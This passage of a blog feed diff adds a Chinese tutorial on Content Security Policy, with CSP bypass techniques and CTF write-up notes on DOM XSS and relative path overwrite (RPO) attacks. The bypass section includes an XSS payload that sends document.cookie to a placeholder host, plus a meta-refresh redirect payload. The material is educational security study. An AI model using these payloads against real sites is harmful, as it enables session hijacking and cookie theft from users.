CSP。一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段。</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs http"><span class="hljs-attribute">Content-Security-Policy</span><span class="hljs-punctuation">: </span>script-src &#x27;self&#x27;; object-src &#x27;none&#x27;;<br>style-src cdn.example.org third-party.org; child-src https:<br></code></pre></div></td></tr></table></figure><p>另一种是通过网页的<code>&lt;meta&gt;</code>标签。</p><figure class="highlight html"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">http-equiv</span>=<span class="hljs-string">&quot;Content-Security-Policy&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.o</span></span><br></code></pre></div></td></tr></table></figure><p>其中每一组策略包含一个策略指令和一个内容源列表。简单的说一下一些策略指令</p><p><strong>default-src</strong></p><p>default-src 作为所有其他指令的备用，一般来说 default-src ‘none’; script-src ‘self’ 这样的情况就会是 script-src 遵循 self，其他的都会使用 none。也就是说，除了被设置的指令以外，其余指令都会被设置为 default-src 指令所设置的属性。</p><p>对于这个属性有个特殊的配置叫 unsafe-eval，它会允许下面几个函数：</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">eval() Function() setTimeout() with an initial argument which is not callable.setInterval() with an initial argument which is not callable.<br></code></pre></div></td></tr></table></figure><p><strong>关键字</strong></p><p><strong>‘none’</strong></p><p>代表空集；即不匹配任何 URL。</p><p><strong>‘self’</strong></p><p>代表和文档同源，包括相同的 URL 协议和端口号。也就是常说的同源策略。</p><p><strong>‘unsafe-inline’</strong></p><p>允许使用内联资源，如内联的 script 元素、javascript: URL、内联的事件处理函数和内联的 style 元素。</p><p><strong>‘unsafe-eval’</strong></p><p>允许使用 eval() 等通过字符串创建代码的方法。</p><p><strong>数据</strong></p><p><strong>data:</strong></p><p>允许 data: URI 作为内容来源。这是不安全的，因为攻击者可以精心构造 data: URI 来攻击。请谨慎地使用这个源，并确保不要用于脚本。</p><p><strong>mediastream:</strong></p><p>允许 mediastream: URI 作为内容来源。</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">Content-Security-Policy: default-src &#x27;self&#x27;; img-src &#x27;self&#x27; data:; media-src mediastream:<br></code></pre></div></td></tr></table></figure><h3 id="csp的一些绕过"><a href="#csp的一些绕过" class="headerlink" title="csp的一些绕过"></a>csp的一些绕过</h3><p><strong>meta网页跳转绕过</strong></p><p>这个情况的话，可以利用 meta 标签实现网页跳转：</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">127.0.0.1/csp/?twosecurity=&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://x.x.x.x/&quot; &gt;<br></code></pre></div></td></tr></table></figure><p><strong>location绕过</strong></p><p>有的情况 csp 会使用 script-src ‘unsafe-inline’; 这个地方可以直接用location.href(window.location/window.open) 绕过</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">127.0.0.1/csp/?twosecurity=&lt;script&gt;location.href=&#x27;http://x.x.x.x/cookie/&#x27;%2bescape(document.cookie);&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p><strong>站点可控静态资源绕过</strong></p><p>给一个绕过 codimd 的 codimd xss</p><p>例子中 codimd 的 CSP 中使用了 google-analytics，而 analytics 中提供了自定义 javascript 的功能（google会封装自定义的js，所以还需要 unsafe-eval），于是可以绕过 CSP。</p><figure class="highlight text"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs text">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;default-src &#x27;self&#x27;; script-src &#x27;unsafe-eval&#x27; https://www.google-analytics.com&quot;&gt;<br>&lt;script src=&quot;https://www.google-analytics.com/gtm/js?id=GTM-PJF5W64&quot;&gt;&lt;/script&gt;<br></code></pre></div></td></tr></table></figure><p>还有很多绕过，参考：<a href="https://lorexxar.cn/2017/10/25/csp-paper/#1%E3%80%82">https://lorexxar.cn/2017/10/25/csp-paper/#1。</a></p><h1 id="ctf例题"><a href="#ctf例题" class="headerlink" title="ctf例题"></a>ctf例题</h1><h2 id="一道XSS题目分析"><a href="#一道XSS题目分析" class="headerlink" title="一道XSS题目分析"></a>一道XSS题目分析</h2><p>题目地址：<a href="https://challenge.intigriti.io/%E3%80%82%E8%83%BD%E8%AE%BF%E9%97%AE%E4%BD%86%E7%8E%AF%E5%A2%83%E5%A5%BD%E5%83%8F%E6%B2%A1%E4%BA%86">https://challenge.intigriti.io/。能访问但环境好像没了</a></p><p>参考题解吧：<a href="https://www.secpulse.com/archives/128882.html">https://www.secpulse.com/archives/128882.html</a></p><figure class="highlight javascript"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> hash = <span class="hljs-built_in">document</span>.location.hash.substr(<span class="hljs-number">1</span>);<br><span class="hljs-keyword">if</span> (hash) &#123;<br>    displayReason(hash);<br>&#125;<br><span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;reasons&quot;</span>).onchange = <span class="hljs-function"><span class="hljs-keyword">function</span> (<span class="hljs-params">e</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span> (e.target.value != <span class="hljs-string">&quot;&quot;</span>)<br>        displayReason(e.target.value);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reasonLoaded</span>(<span class="hljs-params"></span>) </span>&#123;<br>    <span class="hljs-keyword">var</span> reason = <span class="hljs-built_in">document</span>.getElementById(<span class="hljs-string">&quot;reason&quot;</span>);<br>    reason.innerHTML = <span class="hljs-built_in">unescape</span>(<span class="hljs-built_in">this</span>.responseText);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">displayReason</span>(<span class="hljs-params">reason</span>) </span>&#123;<br>    <span class="hljs-built_in">window</span>.location.hash = reason;<br>    <span class="hljs-keyword">var</span> xhr = <span class="hljs-keyword">new</span> XMLHttpRequest();<br>    xhr.addEventListener(<span class="hljs-string">&quot;load&quot;</span>, reasonLoaded);<br>    xhr.open(<span class="hljs-string">&quot;GET&quot;</span>, <span class="hljs-string">`./reasons/<span class="hljs-subst">$&#123;reason&#125;</span>.txt`</span>);<br>    xhr.send();<br>&#125;<br></code></pre></div></td></tr></table></figure><p>总结一下：</p><p>了解<code>inerHTML</code>触发<code>DOMxss</code>漏洞</p><p>寻找content injection</p><p>寻找站内可控的content，通过<code>iframe</code>的<code>srcdoc</code>属性可以绕过<code>innerHTML</code>不解析<code>&lt;script&gt;</code>的限制</p><p>构造payload注入</p><h2 id="34C3CTF-urlstorage"><a href="#34C3CTF-urlstorage" class="headerlink" title="34C3CTF urlstorage"></a>34C3CTF urlstorage</h2><p><a href="https://lorexxar.cn/2018/01/02/34c3-writeup/#CSS-RPO">https://lorexxar.cn/2018/01/02/34c3-writeup/#CSS-RPO</a></p><p><a href="http://www.thespanner.co.uk/2014/03/21/rpo/">http://www.thespanner.co.uk/2014/03/21/rpo/</a></p><p><a href="http://blog.nsfocus.net/rpo-attack/">http://blog.nsfocus.net/rpo-attack/</a></p><p>考点为<code>rpo</code>+<code>csrf</code>+<code>xss</code></p><h3 id="nginx和apache2的差异化"><a href="#nginx和apache2的差异化" class="headerlink" title="nginx和apache2的差异化"></a>nginx和apache2的差异化</h3><p>首先了解一下nginx和apache2对于url地址解析的不同</p><p>nginx对于%2f是能够解析成/的但是apache2不行</p><p><img src="https://img-blog.csdnimg.cn/034c2f2f20c34345947590dd8cb2ec73.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>第二个差异化在于</p><p>在Nginx中，编码后的url服务器可以正常识别，也就是说服务器在加载文件时会解码后找到具体文件返回返回客户端。</p><p>但是在客户端识别url时是不会解码的，正常情况下解码%2f解码后应该加载的是<code>rpo/xxx/../x.js</code>，最后也就是rpo/x.js文件；而这里加载的是/x.js，所以浏览器是没有解码%2f的。</p><p>当url为<code>/rpo/%2f../1.php</code>时最终访问的是<code>/1.php</code></p><p><img src="C:\Users\86130\AppData\Roaming\Typora\typora-user-images\image-20211005115258272.png" alt="image-20211005115258272"></p><p>这里其实是客户端浏览器在加载相对路径文件时是以最后一个/为相对目录加载具体资源文件的。</p><h3 id="简单实例："><a href="#简单实例：" class="headerlink" title="简单实例："></a>简单实例：</h3><h4 id="一：加载静态文件"><a href="#一：加载静态文件" class="headerlink" title="一：加载静态文件"></a>一：加载静态文件</h4><p>现在有一个php路由<code>/rpo/111/1.php</code>源码里面通过<code>&lt;script src=&quot;../x.js&quot;&gt;&lt;/script&gt;</code>用相对目录加载了静态文件，这时如果我们可以控制另外的一个在别的目录下<code>x.js</code>的内容，再让<code>x.js</code>加载到<code>1.php</code>下便可执行恶意代码。</p><p>正常访问下，这里可以随便在111目录下创建个x.js文件。</p><p><img src="https://img-blog.csdnimg.cn/25c3902c99994e1a93d2dd4259e67f09.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAS0tmaW5lXw==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>构造这样一个路由<code>/rpo/222/test.php%2f..%2f..%2f111/1.php</code>便可执行<code>x.js</code>内容。</p><p><img src="https://img-blog.csdnimg.cn/ab9a9b65a09e4ac5bbad4fed5c790b19.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBAcXFfNTM0ODcyNzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>加载其他的静态文件也是一样的原理。</p><h4 id="二：将返回内容按静态文件解析"><a href="#二：将返回内容按静态文件解析" class="headerlink" title="二：将返回内容按静态文件解析"></a>二：<strong>将返回内容按静态文件解析</strong></h4><p>这个懒得做一遍了，简单描述一下就是，在某些场景下类似于在很多使用了<code>url_rewrite</code>的php开发框架以及python web框架中，经常使用相对路径来加载静态资源文件，而且url都有一个特征：</p><p>比如<code>/rpo/user/id/1</code>，这里表示使用参数为<code>id</code>，值为1的内容访问<code>user</code>接口；</p><p>比如<code>/rpo/user.php/name/tester</code>，这里表示使用参数<code>name</code>，内容为tester的内容访问<code>user.php</code>文件等。</p><p>例如这里如果仍然存在一个路由<code>/rpo/user</code>通过相对目录静态加载了<code>style.css</code>和<code>style.js</code>文件。</p><p>在<code>/rpo/user</code>界面我们可以提交内容，然后内容会显示到当前页面，而且使用相对路径加载静态文件style.css和script.js文件，这两个文件原本内容为空，此时我们访问：</p><p>当你访问<code>/rpo/user</code>时加载的是<code>/rpo/user/style.css和/rpo/user/style.js</code>。</p><p>当你用<code>/user/2</code>这里表示使用2作为参数请求user接口，此时加载静态文件和上述相同。</p><p>然后我们提交一段css内容：<code>&#123;&#125; * &#123;color:red;&#125;</code></p><p>当我们访问：<code>/rpo/user/2/xxx</code>时：</p><p><code>&#123;&#125; * &#123;color:red;&#125;</code>这段内容会被当成css解析。</p><p><img src="http://blog.nsfocus.net/wp-content/uploads/2018/01/9-1.png" alt="img"></p><p>这里表示我们使用2/xxx作为参数访问user接口，返回的内容和使用参数2访问返回的内容相同。</p><p>但是浏览器客户端认为2是目录，然后加载的静态文件为:</p><p><code>/user/2/style.css</code></p><p>这里就用到了上面说到的特点，这里的意思是用参数为2，内容为<code>style.css</code>的内容访问user，这里可以发现时加载静态文件返回的内容也是同使用参数2访问时返回内容相同，但是浏览器将会认为这里加载的是样式文件和脚本文件，从而将返回内容解析为css或者js，所以我们提交的css内容：<code>&#123;&#125; * &#123;color:red;&#125; </code>成功解析为css，将页面渲染成红色。</p><p>这里还有个关键就是CSS在加载的时候与JS一样是逐行解析的，不同的是CSS会忽略页面中不符合CSS语法的行。</p><h3 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h3><p><a href="https://l4w.io/2017/12/34c3-ctf-2017-urlstorage-writeup/">https://l4w.io/2017/12/34c3-ctf-2017-urlstorage-writeup/</a></p><p><a href="https://www.secpulse.com/archives/128882.html">https://www.secpulse.com/archives/128882.html</a></p>]]></content>
+    
+    
+    <categories>
+      
+      <category>xss</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>ctf</tag>
+      
+      <tag>web</tag>
+      
+    </tags>
+    
+  </entry>
+  
+  
+  
+  <entry>
     <title>网鼎杯做题记录</title>
     <link href="/2021/09/01/2021-9-1-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/"/>
     <url>/2021/09/01/2021-9-1-%E7%BD%91%E9%BC%8E%E6%9D%AF2020/</url>
@@ -20,9 +209,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -47,9 +236,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -74,9 +263,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -101,9 +290,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -128,9 +317,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -180,9 +369,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -207,9 +396,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -234,9 +423,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -261,9 +450,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -288,9 +477,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -315,9 +504,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -342,9 +531,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -369,9 +558,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -396,9 +585,9 @@
     
     <tags>
       
-      <tag>web</tag>
-      
       <tag>ctf</tag>
+      
+      <tag>web</tag>
       
     </tags>
     
@@ -581,9 +770,9 @@
     
     <tags>
       
-      <tag>BUU</tag>
-      
       <tag>web</tag>
+      
+      <tag>BUU</tag>
       
     </tags>
     
@@ -608,9 +797,9 @@
     
     <tags>
       
-      <tag>BUU</tag>
-      
       <tag>web</tag>
+      
+      <tag>BUU</tag>
       
     </tags>
     
@@ -687,9 +876,9 @@
     
     <tags>
       
-      <tag>BUU</tag>
-      
       <tag>web</tag>
+      
+      <tag>BUU</tag>
       
     </tags>
     
@@ -714,9 +903,9 @@
     
     <tags>
       
-      <tag>BUU</tag>
-      
       <tag>web</tag>
+      
+      <tag>BUU</tag>
       
     </tags>
     
